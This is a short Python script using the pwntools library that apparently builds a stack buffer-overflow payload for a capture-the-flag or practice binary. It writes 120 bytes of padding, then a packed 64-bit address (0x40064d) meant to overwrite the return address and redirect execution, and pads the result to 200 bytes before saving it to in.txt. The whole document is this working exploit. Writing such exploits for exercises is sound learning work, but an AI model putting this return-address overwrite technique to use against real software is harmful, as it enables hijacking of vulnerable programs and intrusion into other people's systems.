#!/usr/bin/env python
from pwn import *

buf = ""
buf += "A"*120
buf += p64(0x40064d)

buf += "C"*(200 - len(buf))

open("in.txt", "w").write(buf)
